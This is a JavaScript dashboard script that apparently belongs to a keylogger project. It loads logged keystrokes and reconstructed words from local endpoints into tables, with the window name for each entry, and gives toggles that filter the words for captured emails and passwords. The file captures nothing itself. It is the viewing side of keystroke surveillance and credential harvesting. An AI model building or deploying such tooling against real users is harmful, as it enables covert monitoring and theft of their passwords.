$(document).ready(function(){
    // Initialise toggle buttons
    $('#emailToggle').bootstrapToggle();
    $('#passwordToggle').bootstrapToggle();

    // Initialise and populate keypresses table
    $('#tableKeypresses').DataTable({
        data: getKeyData(),
        columns: [
            { data: 'datetime' },
            { data: 'processedKey' },
            { data: 'windowName' },
            { data: 'isKeyDown' }
        ],
        "order": [[ 0, "desc" ]]

    });

    // Initialise and populate words table
    $('#tableWords').DataTable({
        data: getWordData(),
        columns: [
            { data: 'datetime' },
            { data: 'windowName' },
            { data: 'processedWord' },
            { data: 'isEmail'},
            { data: 'isPassword' }
        ],
        "order": [[ 0, "desc" ]]

    });
    $('.dataTables_length').addClass('bs-select');

    // Search functionality for toggles
    // ======================
    // =
    // =    Key toggles
    // =
    // ======================
    keyTable = $('#tableKeypresses').DataTable();
    $('#keydownToggle').change(function () {
        var keyDownQuery = "isKeyDown"
        if (this.checked) {
            addSearchParameter(keySearches, keyDownQuery, keyTable)
        } else {
            removeSearchParameter(keySearches, keyDownQuery), keyTable
        }
    });

    $('#noneToggle').change(function () {
        var noneQuery = "^((?!None).)*$"
        if (this.checked) {
            addSearchParameter(keySearches, noneQuery, keyTable)
        } else {
            removeSearchParameter(keySearches, noneQuery, keyTable)
        }
    });

    // ======================
    // =
    // =    Word toggles
    // =
    // ======================
    wordTable = $('#tableWords').DataTable();
    
    $('#emailToggle').change(function () {
        var emailQuery = "isEmail"
        if (this.checked) {
            addSearchParameter(wordSearches, emailQuery, wordTable)
        } else {
            removeSearchParameter(wordSearches, emailQuery, wordTable)
        }
    });

    $('#passwordToggle').change(function () {
        var passwordQuery = "isPassword"
        if (this.checked) {
            addSearchParameter(wordSearches, passwordQuery, wordTable)
        } else {
            removeSearchParameter(wordSearches, passwordQuery, wordTable)
        }
    });

    
})



// =========================
// =
// =        Searching
// =
// =========================
// Searches are stored as strings inside an array
var keySearches = new Set();
var wordSearches = new Set();

// When passed into datatable, these strings will become a single string,
//      with each element separated by a space (" ")

// Add search parameter for table
function addSearchParameter(set, query, table) {
    set.add(query);
    updateTable(table, set);

}

// Remove search parameter for table
function removeSearchParameter(set, query, table) {
    set.delete(query);
    updateTable(table, set);

}

// Convert SET of search queries into string
function generateSearchQuery(set) {
    strArr = [] // store in temporary array
    for (str of set) {
        strArr.push(str);
    }
    return strArr.join(" ")
}

// Refresh table with updated search parameters
function updateTable(table, searchSet) {
    table.search(generateSearchQuery(searchSet), true).draw();
}

// =========================
// =
// =        Keys
// =
// =========================
class Key {
    constructor(datetime, isKeyDown, windowName, processedKey) {
        this.datetime = datetime;
        if (isKeyDown) {
            this.isKeyDown = "isKeyDown"
        } else {
            this.isKeyDown = "notKeyDown"
        }
        this.windowName = windowName;
        this.processedKey = processedKey;

    }
}

function getKeyData() {
    res = []
    var data = $.parseJSON($.ajax({
        url: "./showKeylog",
        method: "GET",
        dataType: 'json',
        async: false
    }).responseText);

    $.each(data, function(key, el) {
        res.push(
            new Key(el.datetime, el.isKeyDown, el.windowName, el.processedKey)
        );
    });

    return res
}


// =========================
// =
// =        Words
// =
// ========================

class Word {
    constructor(datetime, windowName, processedWord, isEmail, isPassword) {
        this.datetime = datetime;
        this.windowName = windowName;
        this.processedWord = processedWord;

        if (isEmail) {
            this.isEmail = "isEmail"
        } else {
            this.isEmail = "notEmail"
        }
        
        if (isPassword) {
            this.isPassword = "isPassword"
        } else {
            this.isPassword = "notPassword"
        }

    }
}

function getWordData() {
    res = []
    var data = $.parseJSON($.ajax({
        url: "./showWordlog",
        method: "GET",
        dataType: 'json',
        async: false
    }).responseText);

    $.each(data, function(key, el) {
        res.push(
            new Word(el.datetime, el.windowName, el.processedWord, el.isEmail, el.isPassword)
        );
    });

    return res
}


